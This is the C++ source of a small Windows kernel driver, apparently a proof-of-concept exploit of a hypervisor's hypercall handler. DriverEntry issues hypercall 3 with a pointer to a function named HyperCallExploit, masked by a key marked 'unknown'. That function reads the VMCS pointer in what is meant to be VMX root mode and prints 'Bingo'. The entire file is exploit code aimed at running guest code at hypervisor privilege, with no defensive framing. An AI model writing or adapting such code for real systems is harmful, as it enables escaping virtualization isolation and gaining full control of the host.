#include <fltKernel.h>
#include <intrin.h>

extern "C" {
	unsigned char __stdcall AsmVmxCall(_In_ ULONG_PTR hypercall_number,
		_In_opt_ void *context);


	_Use_decl_annotations_ VOID Unload(PDRIVER_OBJECT driver_object) {
		driver_object;
		return;
	}

	_Use_decl_annotations_ void HyperCallExploit() {
		ULONG64 vmcs = 0;
		__vmx_vmptrst(&vmcs);
		DbgPrintEx(0, 0, "[HyperCallExploit] Bingo vmcs= %p \r\n", vmcs);
	}

	_Use_decl_annotations_ NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object,
		PUNICODE_STRING registry_path)
	{
		UNREFERENCED_PARAMETER(driver_object);
		UNREFERENCED_PARAMETER(registry_path);
		ULONG64 Key = 0;// unknown;
		driver_object->DriverUnload = Unload;
		AsmVmxCall(3, (void*)((ULONG64)HyperCallExploit ^ Key));
		return STATUS_SUCCESS;
	}
}